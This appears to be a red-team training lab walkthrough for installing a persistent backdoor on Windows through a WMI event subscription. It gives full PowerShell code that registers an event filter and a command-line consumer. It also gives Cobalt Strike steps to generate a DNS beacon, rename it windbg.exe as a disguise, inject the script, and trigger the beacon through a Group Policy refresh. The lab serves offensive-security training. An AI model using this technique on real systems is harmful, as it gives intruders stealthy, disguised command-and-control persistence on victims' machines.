# Elevated Persistence Lab  

>The objective of this lab is to install a persistent backdoor using a WMI event subscription.

===

# WMI Event Subscription

1. Launch Visual Studio Code or PowerShell ISE.
2. Create a new file.
3. Paste the following code:

    ```PowerShell
    function Add-WmiPersistence
    {
       $EventFilterArgs = @{
          EventNamespace = 'root/cimv2'
          Name = "Debug Trace"
          Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
          QueryLanguage = 'WQL'
       }
    
       $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
    
       $CommandLineConsumerArgs = @{
          Name = "Debug Consumer"
          CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
       }
    
       $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
    
       $FilterToConsumerArgs = @{
          Filter = $Filter
          Consumer = $Consumer
       }
    
       Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
    }

    function Remove-WmiPersistence
    {
        Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
    }
    ```

⚠️ This will trigger when the computer updates its Group Policy Objects.

1. Save the script as *C:\Tools\WmiPersistence.ps1*.

1. Launch Cobalt Strike and connect to the team server.
1. Generate a DNS payload.
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **dns**
    3. Click **Generate**
    4. Save to *C:\Payloads\dns_x64.exe*

2. Interact with the SYSTEM Beacon.
3. Upload the payload.
    2. `upload C:\Payloads\dns_x64.exe`
    3. `mv dns_x64.exe windbg.exe`

4. Install the backdoor (using self-injection).
    1. `powershell-import C:\Tools\WmiPersistence.ps1`
    2. `psinject [BEACON PID] x64 Add-WmiPersistence`

5. Trigger the backdoor (can be done in Beacon)
    1. `execute gpupdate /target:computer /force`
    
⚠️ A new DNS Beacon should appear within a few seconds.

6. Remove the persistence
    1. `psinject [BEACON PID] x64 Remove-WmiPersistence`

⚠️ In this lab, you have leveraged a WMI event subscription to execute a payload when the computer refreshes its Group Policy Objects.
